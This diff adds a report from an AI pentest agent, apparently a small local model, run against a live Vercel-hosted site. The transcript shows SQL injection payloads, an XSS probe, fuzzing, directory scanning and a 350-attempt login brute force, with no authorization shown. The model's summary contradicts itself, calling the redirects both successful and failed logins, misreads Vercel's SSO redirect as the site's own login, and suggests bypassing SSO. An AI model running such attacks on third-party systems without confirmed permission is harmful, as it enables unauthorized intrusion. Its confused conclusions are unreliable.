@@ -1,0 +1,190 @@
+==============================================================
+ airecon2 report - pentest one-shot
+ generated : 2026-09-14T18:43:38
+ provider  : local / qwen2.5:3b-16k
+ iterations: 2   ok: True
+==============================================================
+
+Based on the provided tool response, it appears that the system at `https://love-bjuka1.vercel.app/` does not have a standard HTML login form. Instead, it seems to use a SSO (Single Sign-On) mechanism, as indicated by the `https://vercel.com/sso-api` endpoint in the response.
+
+Here's a summary of the findings and recommendations:
+
+### Summary of Attempts:
+- The tool attempted to log in using various common and weak passwords.
+- The responses were consistently a 302 redirect to a SSO API endpoint, with a unique nonce value appended to the URL.
+
+### Key Observations:
+- The system does not have a standard HTML login form.
+- The login attempts were successful (status 302), but the actual login was handled by the SSO mechanism.
+- The tool detected no login form on the page, which is why the login attempts were not successful.
+
+### Recommendations:
+1. **Run a Directory Buster Scan:**
+   - Since the system does not have a standard HTML login form, it's likely that the login functionality is hidden behind a directory or file. Use a tool like DirBuster to scan the directory structure of the site.
+   - Focus on directories that might contain login-related files or pages, such as `/login`, `/admin`, `/secure`, etc.
+
+2. **Inspect the SSO API Endpoint:**
+   - The SSO API endpoint (`https://vercel.com/sso-api`) is a good starting point. Analyze the structure of the API requests and responses to understand how the login process works.
+   - Look for any patterns or parameters that might indicate the login process, such as username, password, and nonce values.
+
+3. **Manual Verification:**
+   - Since the tool detected no login form, manually inspect the page for any hidden forms or inputs that might be used for login.
+   - Check for any JavaScript that might handle the login process.
+
+4. **Check for Cross-Site Request Forgery (CSRF) Tokens:**
+   - The nonce values in the SSO API requests suggest that CSRF tokens might be used. Look for any tokens that might be used to prevent CSRF attacks.
+
+### Example of SSO API Request:
+Here's an example of a request to the SSO API:
+```json
+{
+  "user": "dvwa",
+  "password": "password",
+  "status": 302,
+  "location": "https://vercel.com/sso-api?url=https%3A%2F%2Flove-bjuka1.vercel.app%2F&nonce=2e4555835f02c87214ccda8fced76c48bdc020a1970fabeace9757031aa4df6e",
+  "note": "differs from failed-login baseline - verify manually"
+}
+```
+
+### Conclusion:
+The system uses a SSO mechanism for login, which is why the standard login attempts did not work. Focus on finding the login functionality through directory scanning and analyzing the SSO API requests. This should help you understand how the login process works and potentially bypass the SSO mechanism.
+
+--------------------------------------------------------------
+ TOOL TRANSCRIPT (what the AI actually did)
+--------------------------------------------------------------
+[iter 1] http_probe {"url": "https://love-bjuka1.vercel.app"}
+    {"status": 302, "allow": "(none)"}
+
+[iter 1] fetch_headers {"url": "https://love-bjuka1.vercel.app"}
+    {
+     "status": 200,
+     "headers": {
+      "Access-Control-Allow-Origin": "*",
+      "Content-Security-Policy": "default-src 'self' vercel.com *.vercel.com *.vercel.sh vercel.live *.stripe.com twitter.com *.twitter.com *.google.com *.github.com *.codesandbox.io https://risk.clearbit.com wss://*.vercel.com localhost:* chrome-extension://*;script-src 'self' 'unsafe-eval' 'unsafe-inline' blob: www.google.com www.gstatic.com *.youtube.com *.youtube-nocookie.com *.ytimg.com *.twimg.com cdn.ampproject.org *.googleapis.com *.fides-cdn.ethyca.com *.ethyca.com cdn.ethyca.com cdn.vercel-insights.com va.vercel-script
+
+[iter 1] fetch_page {"url": "https://love-bjuka1.vercel.app", "max_chars": 6000}
+    {"status": 200, "content_type": "text/html; charset=utf-8", "length": 337195, "body": "<!DOCTYPE html><html data-dpl-id=\"dpl_3k9df5ga3nxxNWzdGQRy2fe2WvzQ\" class=\"VEU71W_className fTT4la_className VEU71W_variable fTT4la_variable dash\" lang=\"en-US\"><head><meta charSet=\"utf-8\"/><meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1\"/><link rel=\"stylesheet\" href=\"/_next/static/immutable/chunks/1_tk1fddn6sj2.css\" data-precedence=\"next\"/><link rel=\"stylesheet\" href=\"/_next/static/immutable/chunks/186e5ohbialfi.css\" data-precedence=\"next\"/><link re
+
+[iter 1] dirbuster {"base_url": "https://love-bjuka1.vercel.app"}
+    {
+     "target": "love-bjuka1.vercel.app",
+     "checked": 32,
+     "found": []
+    }
+
+[iter 1] param_fuzz {"url": "https://love-bjuka1.vercel.app"}
+    {
+     "target": "love-bjuka1.vercel.app",
+     "probes": [
+      {
+       "param": "id",
+       "status": 200,
+       "bytes": 337727,
+       "reflected": false
+      },
+      {
+       "param": "q",
+       "status": 200,
+       "bytes": 337730,
+       "reflected": false
+      },
+      {
+       "param": "search",
+       "status": 200,
+       "bytes": 337751,
+       "reflected": false
+      },
+      {
+       "param": "page",
+       "status": 200,
+       "bytes": 337741,
+       "reflected": false
+      },
+      {
+       "param": "user",
+       "status": 200,
+       "bytes": 337745,
+       "reflected": false
+      },
+      {
+       "param": "name",
+       "status": 200,
+       "bytes": 337745,
+       "reflected": false
+      },
+      {
+       "param": "
+
+[iter 1] xss_probe {"url": "https://love-bjuka1.vercel.app"}
+    {
+     "target": "love-bjuka1.vercel.app",
+     "param": "q",
+     "reflected_hits": [],
+     "note": "reflection is a lead; verify exploitability manually"
+    }
+
+[iter 1] sqli_probe {"url": "https://love-bjuka1.vercel.app"}
+    {
+     "target": "love-bjuka1.vercel.app",
+     "param": "id",
+     "sqli_leads": [
+      {
+       "payload": "' OR '1'='1",
+       "signals": [
+        "size 337231->337881"
+       ]
+      },
+      {
+       "payload": "1' ORDER BY 10--",
+       "signals": [
+        "size 337231->337852"
+       ]
+      },
+      {
+       "payload": "1 UNION SELECT NULL,NULL--",
+       "signals": [
+        "size 337231->337924"
+       ]
+      },
+      {
+       "payload": "1 AND SLEEP(3)--",
+       "signals": [
+        "size 337231->337838"
+       ]
+      },
+      {
+       "payload": "1; SELECT 1--",
+       "signals": [
+        "size 337231->337815"
+       ]
+      }
+     ],
+     "note": "signals are leads; call sqli_confirm for sqlmap proof"
+    }
+
+[iter 1] login_bruteforce {"url": "https://love-bjuka1.vercel.app"}
+    {
+     "target": "love-bjuka1.vercel.app",
+     "form_discovered": false,
+     "fields": {
+      "post_url": "https://love-bjuka1.vercel.app",
+      "user": "",
+      "pass": ""
+     },
+     "attempts": 350,
+     "request_errors": 0,
+     "candidate_creds": [
+      {
+       "user": "admin",
+       "password": "admin",
+       "status": 302,
+       "location": "https://vercel.com/sso-api?url=https%3A%2F%2Flove-bjuka1.vercel.app%2F&nonce=a5f0b265241b29454df7f55066a80f4735d6e523873767db701abe7461bd1a47",
+       "note": "differs from failed-login baseline - verify manually"
+      },
+      {
+       "user": "admin",
+       "password": "password",
+       "status": 302,
+       "location":
+
+==============================================================
